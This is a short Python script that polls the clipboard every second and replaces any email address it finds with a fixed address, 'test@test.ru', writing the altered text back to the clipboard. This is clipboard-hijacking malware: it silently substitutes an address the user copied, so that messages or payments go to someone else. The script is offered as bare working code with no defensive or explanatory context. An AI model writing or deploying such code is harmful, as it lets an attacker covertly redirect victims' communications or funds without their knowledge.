import time
import pyperclip
import re
value = ''
while True:
    s = pyperclip.paste()
    if (s != value):
        print(s)
        mail = re.findall(r'[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z0-9]+', s)
        y = str(mail)
        t = y.replace("['", "")
        v = t.replace("']", "")
        buff = s.replace(v, 'test@test.ru')
        a = pyperclip.copy(buff)
        value = s
    time.sleep(1)